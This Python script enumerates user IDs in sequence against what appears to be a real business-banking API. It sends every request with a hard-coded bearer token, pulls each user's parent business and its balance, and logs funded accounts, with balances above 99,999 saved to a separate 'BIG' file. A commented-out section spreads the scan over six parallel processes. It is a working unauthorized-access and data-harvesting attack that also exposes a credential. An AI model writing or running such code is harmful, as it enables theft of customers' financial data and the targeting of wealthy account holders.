import requests, json, time
from functions import getTx
import multiprocessing as mp
import time

bearer = "Bearer eyJhbGciOiJIUzI1NiJ9.eyJyb2xlcyI6IlVTRVIiLCJpYXQiOjE2ODA1MTAxODMsInN1YiI6IjIyMjM5NyIsImV4cCI6MTY4MDU5NjU4M30.saUz-oTGZTD_O9Z-WaK50ayDCNSHBMit0ctiIYbcrwQ"

#def mainProg(m,n,p,fn):
userid = input("Enter starting point: ") #400683
userid = int(userid.strip())
fn = "All-300000.txt"
while userid < 300000:
	try:
		userid += 1
		url = f'https://business-banking.kudi.ai/user/{userid}'
		mheaders = {"Authorization": bearer}
		x = requests.get(url, headers = mheaders)
		resp = x.text
		resp = resp[27:46]
		#print(resp)
		if resp == "User does not exist":
			print(f"process: 1=>>{userid}==> user does not exist")
		else:
			print(x.text)
			json_data = json.loads(x.text)
			try:
				id2 = json_data['data']['parentBusiness']
			except:
				#time.sleep(2)
				id2 = json_data['data']['parentBusiness'] or 10841
			"""
			url2 = f'https://business-banking.kudi.ai/business/{id2}/get-wallet-and-ledger-balance'
			x2 = requests.get(url2, headers = mheaders)
			json_data2 = json.loads(x2.text)
			"""
			#try:
			"""
				balance = json_data2['data']['ledgerBalance']
			"""
			balance = getTx(id2)
			#print(balance)
			#exit()
			print(f"process: 1=>>Balance for {id2}==>\n {balance}")
			#except:
			#print("No Business Found For UID!")
			#balance = 0.0
			#time.sleep(2)
			if float(balance) > 0.0:
				with open(fn, "a") as handle:
					handle.write(str(json_data['data']['id']) + "/" + str(id2) + " - " + str(balance) + "\n")
					print("\n ID recorded")
	
				if float(balance) > 99999.0:
					with open("BIG/" + fn, "a") as handle:
						handle.write(str(json_data['data']['id']) + "/" + str(id2) + " - " + str(balance) + "\n")
						print("\n BIG ID recorded")
				#exit()
	except:
		pass

"""
if __name__ == '__main__':
	p1 = mp.Process(target=mainProg, args=(27559, 300000, 1, "All-300000.txt"))
	
	p2 = mp.Process(target=mainProg, args=(50000, 100000, 2, "100000.txt"))
	p3 = mp.Process(target=mainProg, args=(100000, 150000, 3, "150000.txt"))
	p4 = mp.Process(target=mainProg, args=(150000, 200000, 4, "200000.txt"))
	p5 = mp.Process(target=mainProg, args=(200000, 250000, 5, "250000.txt"))
	p6 = mp.Process(target=mainProg, args=(250000, 300000, 6, "300000.txt"))
	
	p1.start()
	
	p2.start()
	p3.start()
	p4.start()
	p5.start()
	p6.start()
	"""

